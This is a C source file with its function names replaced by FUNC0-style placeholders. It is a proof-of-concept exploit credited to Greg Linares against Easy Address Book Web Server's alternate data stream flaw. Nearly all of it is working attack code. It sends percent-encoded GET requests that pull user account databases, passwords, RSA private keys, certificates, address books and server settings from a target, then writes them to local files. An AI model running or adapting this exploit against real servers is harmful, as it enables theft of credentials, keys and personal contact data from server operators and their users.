#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ *,char*,char*) ; 
 int /*<<< orphan*/  INTERNET_OPEN_TYPE_DIRECT ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (char*) ; 
 char* endmsg ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 char* exploit ; 
 char* exploit2 ; 
 char* exploit3 ; 
 char* exploit4 ; 
 char* exploit5 ; 
 char* exploit6 ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  file ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ) ; 
 int httpport ; 
 int /*<<< orphan*/ * inet ; 
 char* logmsg ; 
 int mthd ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 

int FUNC13 (int argc, char *argv[])
{

	FUNC9("\n=========================================================================\n");
	FUNC9("0-day Easy Address Book Web Server Alternative File Stream Exploit\n");
	FUNC9("Discovered and Coded by Greg Linares ==> GLinares.code [at] gmail [dot] com\n");
	FUNC9("This tool demonstrates EFS Address Book Server's Vulnerability to Alternative\n");
	FUNC9("Data Stream GET requests which allow unauthorized users to download server \n");
	FUNC9("critical files.\n");
	FUNC9("Discovered and Reported: 11-1-2006\n");
	FUNC9("\nUsage: %s <hostname/IP> [port 80=default] [Method see below]\n", argv[0]);
	FUNC9("--------PoC Methods:-----\n");
	FUNC9("1 = Gather all login username and passwords and email addresses.[Default]\n");
	FUNC9("2 = Gather Private RSA Keys and Certificates for server.\n");
	FUNC9("3 = Gather All Address Books and Contact Information on the server\n");
	FUNC9("4 = Gather Server Settings File and SMTP server info.\n");
	FUNC9("============================================================================\n");


    inet = FUNC2("ESF Exp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (inet == NULL)
	{
		FUNC9("Error accessing InternetOpen API - Exiting...\n");
		FUNC5(1);
	}
	if (argc < 2)
	{
		FUNC9("Invalid # of arguments...Exiting\n");
		FUNC5(1);
	}
	if (FUNC4(argv[3]) > 4)
	{
		mthd = 1;
	}
	if (FUNC4(argv[3]) <= 0)
	{
		mthd = 1;
	}
	mthd = FUNC4(argv[3]);

	/* Set Up Exploits */
	switch(mthd)
	{
    	case 1:
			file = FUNC7("Accounts.txt","a+");
			FUNC10(exploit, "%s", "%2F%61%64%64%72%62%6F%6F%6B%2F%75%73%65%72%2E%73%64%62");
			FUNC10(endmsg, "%s", "\n\n\nResults Dumped to Accounts.txt\n");
			break;
		case 2:
			file = FUNC7("RSAKeys.txt", "a+");
			FUNC10(exploit, "%s", "%53%65%72%76%65%72%4B%65%79%2E%70%65%6D");
			FUNC10(endmsg, "%s", "\n\n\nResults Dumped to RSAKeys.txt\n");
			break;
		case 3:
			file = FUNC7("AddrBooks.txt", "a+");
			FUNC10(exploit, "%s", "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%31%2E%73%64%62");
			FUNC10(endmsg, "%s", "\n\n\nResults Dumped to Messages.txt\n");
			break;
		case 4:
			file = FUNC7("Server.txt", "a+");
			FUNC10(exploit, "%s", "%6F%70%74%69%6F%6E%2E%69%6E%69");
			FUNC10(endmsg, "%s", "\n\n\nResults Dumped to Server.txt\n");
			break;
	}



	FUNC10(logmsg, "%s", argv[1]);
	FUNC10(logmsg, "%s", "\r\n\r\n\r\n");
	FUNC8(logmsg, FUNC12(logmsg), 1, file);
	httpport = FUNC4(argv[2]);
	FUNC0(inet, argv[1], exploit);
	if (mthd == 3)
	{
		FUNC9("\n\n Sending 2nd Exploit...\n");
		FUNC11(exploit2, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%32%2E%73%64%62");
		FUNC0(inet, argv[1], exploit2);
		FUNC9("\n\n Sending 3rd Exploit...\n");
		FUNC11(exploit3, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%33%2E%73%64%62");
		FUNC0(inet, argv[1], exploit3);
		FUNC9("\n\n Sending 4th Exploit...\n");
		FUNC11(exploit4, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%5F%75%73%65%72%2E%73%64%62");
		FUNC0(inet, argv[1], exploit4);
		FUNC9("\n\n Sending final Exploit...\n");
		FUNC11(exploit5, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%67%72%6F%75%70%2E%73%64%62");
		FUNC0(inet, argv[1], exploit5);
	}
	if (mthd == 2)
	{
		FUNC9("\n\n Sending 2nd Exploit...\n");
		FUNC11(exploit2, "%53%65%72%76%65%72%43%65%72%74%2E%70%65%6D");
		FUNC0(inet, argv[1], exploit2);
		FUNC9("\n\n Sending 3rd Exploit...\n");
		FUNC11(exploit3, "%52%6F%6F%74%43%65%72%74%2E%70%65%6D");
		FUNC0(inet, argv[1], exploit3);
		FUNC9("\n\n Sending 4th Exploit...\n");
		FUNC11(exploit4, "%65%66%73%77%73%5F%6B%65%79%2E%70%65%6D");
		FUNC0(inet, argv[1], exploit4);
		FUNC9("\n\n Sending 5th Exploit...\n");
		FUNC11(exploit5, "%65%66%73%77%73%5F%72%65%71%2E%70%65%6D");
		FUNC0(inet, argv[1], exploit5);
		FUNC9("\n\n Sending final Exploit...\n");
		FUNC11(exploit6, "%65%66%73%77%73%5F%72%61%6E%64%2E%74%78%74");
		FUNC0(inet, argv[1], exploit6);
	}

	FUNC6(file);
    FUNC3(500);
    FUNC1(inet);
	FUNC9("\n\n===================================================\n");
	FUNC9("%s\n", endmsg);
	FUNC9("Proof Of Concept Exploit by Greg Linares\n");
	FUNC9("Send Comments/Concerns/Questions/Etc to GLinares.code [at] gmail [dot] com\n");
    return 0;

}